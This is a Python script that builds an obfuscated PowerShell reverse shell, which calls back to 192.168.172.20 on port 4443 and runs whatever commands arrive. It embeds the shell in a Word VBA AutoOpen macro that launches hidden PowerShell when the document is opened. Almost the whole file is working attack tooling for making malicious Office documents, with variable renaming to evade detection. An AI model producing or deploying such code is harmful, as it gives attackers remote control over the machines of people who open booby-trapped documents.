import random
import string

def generate_variable_name():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

def obfuscate_powershell(payload):
    var_map = {}
    variables = ["$TCPClient", "$NetworkStream", "$StreamWriter", "$Buffer", "$BytesRead",
                 "$Command", "$Output", "$script:Buffer", "$String", "$pl7zbgrl"]
    for var in variables:
        var_map[var] = "$" + generate_variable_name()
    for original, obfuscated in var_map.items():
        payload = payload.replace(original, obfuscated)

    original_func_name = "WriteToStream"
    obfuscated_func_name = generate_variable_name()
    payload = payload.replace(f"function {original_func_name}", f"function {obfuscated_func_name}")
    payload = payload.replace(f"{original_func_name} ", f"{obfuscated_func_name} ")

    return payload

def generate_macro(one_liner_payload):
    macro_code = f'''
Sub AutoOpen()
    Dim cmd As String
    cmd = "powershell -w hidden -nop -c ""{one_liner_payload}"""
    CreateObject("WScript.Shell").Run cmd, 0, False
End Sub
'''
    with open("macro.vba", "w") as f:
        f.write(macro_code)
    print("[+] Macro code written to 'macro.vba'. Paste this into Word manually.")

# Initial payload
powershell_payload = """
$TCPClient = New-Object Net.Sockets.TCPClient('192.168.172.20', 4443);
$NetworkStream = $TCPClient.GetStream();
$StreamWriter = New-Object IO.StreamWriter($NetworkStream);
function WriteToStream ($String) {
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};
    $StreamWriter.Write($String);
    $StreamWriter.Flush()
}
WriteToStream '';
[byte[]]$pl7zbgrl = 0..$TCPClient.ReceiveBufferSize | % {0};
while(($BytesRead = $NetworkStream.Read($pl7zbgrl, 0, $pl7zbgrl.Length)) -gt 0) {
    $Command = ([text.encoding]::UTF8).GetString($pl7zbgrl, 0, $BytesRead - 1);
    $Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}
    WriteToStream ($Output)
}
$StreamWriter.Close()
"""

# Obfuscate and print the payload
obfuscated = obfuscate_powershell(powershell_payload)
print(obfuscated)

# One-liner format for macro insertion into VBA
one_liner = obfuscated.replace('\n', '').replace('\r', '').replace('"', '""')
generate_macro(one_liner)
